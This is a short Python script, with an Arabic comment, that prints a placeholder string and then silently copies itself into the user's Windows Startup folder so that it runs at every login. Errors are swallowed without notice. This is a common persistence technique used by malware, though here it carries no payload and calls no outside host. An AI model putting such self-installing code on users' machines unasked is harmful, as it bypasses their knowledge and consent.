import os
import shutil
import sys
from pathlib import Path

print("xxxxx")


def add_to_startup(script_path=None):

    if script_path is None:
        script_path = sys.argv[0]


    startup_folder = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

    # التحقق من وجود المجلد
    if not startup_folder.exists():
        return


    script_name = Path(script_path).name
    destination = startup_folder / script_name

    try:
        shutil.copy(script_path, destination)
    except:
        pass
      
add_to_startup()
